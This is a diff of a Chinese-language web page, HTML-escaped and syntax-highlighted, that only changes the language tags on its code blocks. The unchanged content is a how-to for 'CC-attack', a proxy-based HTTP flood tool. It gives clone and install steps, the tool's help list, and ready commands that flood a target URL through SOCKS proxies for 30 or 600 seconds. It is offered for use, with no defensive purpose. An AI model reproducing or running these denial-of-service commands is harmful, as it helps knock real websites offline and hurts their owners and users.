@@ -11,7 +11,7 @@
 &lt;/span>&lt;span class="lnt">3
 &lt;/span>&lt;/code>&lt;/pre>&lt;/td>
 &lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">pip3 install requests pysocks
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-Bash" data-lang="Bash">&lt;span class="line">&lt;span class="cl">pip3 install requests pysocks
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">git clone https://github.com/kolbwang/cc-attack.git
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> cc-attack
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
@@ -22,7 +22,7 @@
 &lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
 &lt;/span>&lt;/code>&lt;/pre>&lt;/td>
 &lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">python3 cc.py
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-Bash" data-lang="Bash">&lt;span class="line">&lt;span class="cl">python3 cc.py
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>&lt;strong>这个脚本很老了 总是会停攻击&lt;/strong>&lt;/p>
@@ -40,7 +40,7 @@
 &lt;/span>&lt;span class="lnt">4
 &lt;/span>&lt;/code>&lt;/pre>&lt;/td>
 &lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">pip3 install requests pysocks
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-Bash" data-lang="Bash">&lt;span class="line">&lt;span class="cl">pip3 install requests pysocks
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">git clone https://github.com/Leeon123/CC-attack.git
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 也可以直接下载下来&lt;/span>
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> CC-attack
@@ -52,7 +52,7 @@
 &lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
 &lt;/span>&lt;/code>&lt;/pre>&lt;/td>
 &lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">python cc.py &amp;lt;arguments&amp;gt;
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-Bash" data-lang="Bash">&lt;span class="line">&lt;span class="cl">python cc.py &amp;lt;arguments&amp;gt;
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;div class="highlight">&lt;div class="chroma">
@@ -75,7 +75,7 @@
 &lt;/span>&lt;span class="lnt">16
 &lt;/span>&lt;/code>&lt;/pre>&lt;/td>
 &lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="o">===============&lt;/span> CC-attack &lt;span class="nb">help&lt;/span> &lt;span class="nv">list&lt;/span> &lt;span class="o">===============&lt;/span>
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-Bash" data-lang="Bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">===============&lt;/span> CC-attack &lt;span class="nb">help&lt;/span> &lt;span class="nv">list&lt;/span> &lt;span class="o">===============&lt;/span>
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -h/help &lt;span class="p">|&lt;/span> showing this message
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -url &lt;span class="p">|&lt;/span> &lt;span class="nb">set&lt;/span> target url
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -m/mode &lt;span class="p">|&lt;/span> &lt;span class="nb">set&lt;/span> program mode
@@ -100,7 +100,7 @@
 &lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
 &lt;/span>&lt;/code>&lt;/pre>&lt;/td>
 &lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">python cc.py -down -f proxy.txt -v &lt;span class="m">5&lt;/span>
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-Bash" data-lang="Bash">&lt;span class="line">&lt;span class="cl">python cc.py -down -f proxy.txt -v &lt;span class="m">5&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>使用自定义代理列表（socks4.txt）攻击目标 30 秒：&lt;/p>
@@ -109,7 +109,7 @@
 &lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
 &lt;/span>&lt;/code>&lt;/pre>&lt;/td>
 &lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">python cc.py -url http://target.com -f socks4.txt -v &lt;span class="m">4&lt;/span> -s &lt;span class="m">30&lt;/span>
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-Bash" data-lang="Bash">&lt;span class="line">&lt;span class="cl">python cc.py -url http://target.com -f socks4.txt -v &lt;span class="m">4&lt;/span> -s &lt;span class="m">30&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;h4 id="启动脚本">启动脚本&lt;/h4>
@@ -120,7 +120,7 @@
 &lt;/span>&lt;span class="lnt">2
 &lt;/span>&lt;/code>&lt;/pre>&lt;/td>
 &lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-batch" data-lang="batch">&lt;span class="line">&lt;span class="cl"># 填入下面的链接 嫌烦就去掉这个注释
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-Batchfile" data-lang="Batchfile">&lt;span class="line">&lt;span class="cl"># 填入下面的链接 嫌烦就去掉这个注释
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python cc.py -url https://网站.com -v 5 -s 600 # 默认是proxy.txt
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
